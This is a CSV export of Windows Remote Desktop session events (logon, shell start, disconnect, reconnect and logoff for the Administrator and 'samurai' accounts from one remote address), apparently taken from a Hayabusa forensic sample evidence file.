RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
2279,2279,2024-11-22 21:53:47.5079710,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2280,2280,2024-11-22 21:53:49.7688182,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2281,2281,2024-11-22 21:53:49.8051987,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2282,2282,2024-11-22 21:53:49.8122846,54,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,376,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2283,2283,2024-11-22 21:54:15.1861994,32,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,924,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""messageName"":""RDSAppXPlugin""}}}"
2284,2284,2024-11-22 21:54:15.1889551,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2285,2285,2024-11-22 21:54:15.1902007,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2286,2286,2024-11-22 21:54:15.1904528,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2287,2287,2024-11-22 21:54:15.1910100,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2288,2288,2024-11-22 21:54:15.1913195,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2289,2289,2024-11-22 21:54:19.2956674,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2290,2290,2024-11-22 21:54:19.2958874,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2291,2291,2024-11-22 21:54:19.3626110,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2292,2292,2024-11-22 21:54:21.6979774,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2293,2293,2024-11-22 21:54:40.1994369,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2294,2294,2024-11-22 21:54:40.2420186,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2295,2295,2024-11-22 21:54:40.2454371,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2296,2296,2024-11-22 21:55:10.4399872,54,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,1200,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2297,2297,2024-11-22 22:30:38.9797626,32,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,552,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""messageName"":""RDSAppXPlugin""}}}"
2298,2298,2024-11-22 22:36:22.6415342,41,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2""}}}"
2299,2299,2024-11-22 22:36:22.6513945,42,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2""}}}"
2300,2300,2024-11-22 22:36:23.6347664,21,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logon succeeded,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2301,2301,2024-11-22 22:36:24.3855711,22,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Shell start notification received,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2302,2302,2024-11-22 22:37:00.9961072,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 2,Reason: No additional information is available (i.e. the user has closed RDP window),,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""2"",""Reason"":""0""}}}"
2303,2303,2024-11-22 22:37:06.7069807,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2304,2304,2024-11-22 22:37:46.1843016,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,3592,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 2,Reason: The client's connection was replaced by another connection (i.e. a user reconnected to a previous RDP session),,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""2"",""Reason"":""5""}}}"
2305,2305,2024-11-22 22:37:46.9488957,25,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,3592,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session reconnection succeeded,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2306,2306,2024-11-22 22:38:40.3691078,23,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,3480,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logoff succeeded,EC2AMAZ-3NFFVNI\Administrator,,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2""}}}"
2307,2307,2024-11-22 22:38:40.8849802,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 2,Reason: The disconnection was initiated by the user logging off his or her session on the server,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""2"",""Reason"":""12""}}}"
2308,2308,2024-11-22 22:38:40.9881075,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2309,2309,2024-11-22 22:39:20.2253044,41,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3""}}}"
2310,2310,2024-11-22 22:39:20.2406788,42,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3""}}}"
2311,2311,2024-11-22 22:39:20.5052651,21,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,3592,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logon succeeded,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 3,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3"",""Address"":""219.100.37.234""}}}"
2312,2312,2024-11-22 22:39:20.9199133,22,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Shell start notification received,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3"",""Address"":""219.100.37.234""}}}"
2313,2313,2024-11-22 22:45:55.4618784,23,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logoff succeeded,EC2AMAZ-3NFFVNI\Administrator,,Session ID: 3,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3""}}}"
2314,2314,2024-11-22 22:45:55.8932403,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 3,Reason: The disconnection was initiated by the user logging off his or her session on the server,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""3"",""Reason"":""12""}}}"
2315,2315,2024-11-22 22:45:56.0767078,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 3,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3"",""Address"":""219.100.37.234""}}}"
2316,2316,2024-11-22 22:47:27.6393641,41,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4""}}}"
2317,2317,2024-11-22 22:47:27.6455200,42,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4""}}}"
2318,2318,2024-11-22 22:47:31.5487571,21,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logon succeeded,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 4,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4"",""Address"":""219.100.37.234""}}}"
2319,2319,2024-11-22 22:47:31.9642288,22,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Shell start notification received,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4"",""Address"":""219.100.37.234""}}}"
2320,2320,2024-11-22 22:48:00.9471093,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 4,Reason: No additional information is available (i.e. the user has closed RDP window),,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""4"",""Reason"":""0""}}}"
2321,2321,2024-11-22 22:48:01.8423921,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 4,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4"",""Address"":""219.100.37.234""}}}"
